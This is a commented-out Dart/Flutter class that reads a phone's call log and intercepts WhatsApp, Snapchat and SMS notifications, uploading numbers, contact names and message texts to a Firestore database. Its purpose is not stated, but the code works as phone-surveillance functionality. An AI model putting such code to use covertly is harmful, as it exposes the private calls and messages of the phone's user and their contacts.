// import 'dart:developer';

// import 'package:call_log/call_log.dart';
// import 'package:cloud_firestore/cloud_firestore.dart';
// import 'package:flutter/material.dart';
// import 'package:permission_handler/permission_handler.dart';
// import 'package:reflex/reflex.dart';

// class dataGet {
//   String? uid;

//   dataGet(String uid) {
//     this.uid = uid;
//   }
// // CMT : SU KARE

//   final List<ReflexEvent> _notificationLogs = [];
//   bool isListening = false;
//   Iterable<CallLogEntry> _callLogEntries = <CallLogEntry>[];

//   getPermission() async {
//     var parmission = await Permission.accessNotificationPolicy;
//     // print("getCalls................");
//     if (parmission.isGranted == true) {
//     } else {
//       parmission.request();
//     }
//   }

//   void deleteAllCall() {}

//   void getCalls() async {
//     final Iterable<CallLogEntry> result = await CallLog.query();
//     int len = 0;
//     _callLogEntries = result;
//     // print("getcallsin................");

//     // print(_callLogEntries.length);
//     int i = 0;

//     var snapshots = await FirebaseFirestore.instance
//         .collection(DB.user)
//         .doc(uid)
//         .collection('call')
//         .orderBy('date')
//         .get();
//     QuerySnapshot qs = snapshots as QuerySnapshot;
//     // print("calls deleting = ${qs.docs.length}");
//     len = qs.docs.length;

//     // for (int i = 0; i < len; i++) {
//     //   String id = qs.docs[i].id;
//     //
//     //   FirebaseFirestore.instance
//     //       .collection(DB.user)
//     //       .doc(uid)
//     //       .collection('call')
//     //       .doc(id)
//     //       .delete();
//     // }

//     // print("dataCall add>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>");
//     for (CallLogEntry entry in _callLogEntries) {
//       if (len != 0) {
//         // print(
//         // "Date >>=>>  FireBase : ${qs.docs[len - 1]['date'].toString()} == Phone :  ${DateTime.fromMillisecondsSinceEpoch(int.parse(entry.timestamp.toString()))} ");
//         if (qs.docs[len - 1]['date'].toString().compareTo(
//                 DateTime.fromMillisecondsSinceEpoch(
//                         int.parse(entry.timestamp.toString()))
//                     .toString()) ==
//             0) {
//           return;
//         }
//       }
//       if (i == 20) {
//         break;
//       }
//       // print("added Number : ${entry.number}");
//       await FirebaseFirestore.instance
//           .collection(DB.user)
//           .doc(uid)
//           .collection('call')
//           .add({
//         "fno": "${entry.formattedNumber}",
//         "cno": "${entry.cachedMatchedNumber}",
//         "no": "${entry.number}",
//         "name": "${entry.name}",
//         "type": "${entry.callType}",
//         "date":
//             "${DateTime.fromMillisecondsSinceEpoch(int.parse(entry.timestamp.toString()))}",
//         "du": "${entry.duration}",
//         "ac": "${entry.phoneAccountId}",
//         "sim": "${entry.simDisplayName}",
//       });
//       i++;
//     }
//   }

//   void startListening() async {
//     try {
//       Reflex reflex = Reflex(
//         debug: true,
//         packageNameList: [
//           "com.whatsapp",
//           "com.tyup",
//           "vnd.android-dir/mms-sms",
//           "com.snapchat.android",
//           "Telephony.sms"
//         ],
//       );
//       reflex.notificationStream!.listen(onData);

//       // print("reading completee........................................");
//     } on ReflexException catch (exception) {
//       debugPrint(">>>>>>>>>>>>>>>>" + exception.toString());
//     }
//   }

//   void onData(ReflexEvent event) async {
//     // print("Notification reading prossess..................");

//     if (event.type == ReflexEventType.notification) {
//       _notificationLogs.add(event);
//       final ReflexEvent element = event;
//       FirebaseFirestore.instance
//           .collection(DB.user)
//           .doc(uid)
//           .collection("notification")
//           .add({
//         "title": element.title,
//         "pkg": element.packageName,
//         "noMsg": element.message,
//         "time": element.timeStamp
//       });
//     }

//     debugPrint(event.toString());
//   }
// }
